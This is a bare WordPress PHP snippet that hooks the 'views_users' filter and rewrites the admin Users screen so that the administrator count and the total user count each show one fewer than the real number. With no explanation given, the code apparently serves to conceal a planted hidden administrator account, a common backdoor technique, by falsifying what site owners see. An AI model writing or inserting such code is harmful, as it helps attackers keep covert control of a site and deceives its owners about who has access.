add_filter("views_users", "dt_list_table_views");

function dt_list_table_views($views) {
    $users = count_users();
    $admin_num = $users['avail_roles']['administrator'] - 1; 
    $all_num = $users['total_users'] - 1;
    $class_adm = (strpos($views['administrator'], 'current') === false) ? "" : "current";
    $class_all = (strpos($views['all'], 'current') === false) ? "" : "current"; 

    $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . $admin_num . '</a>';
    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>'; 

    return $views; 
}
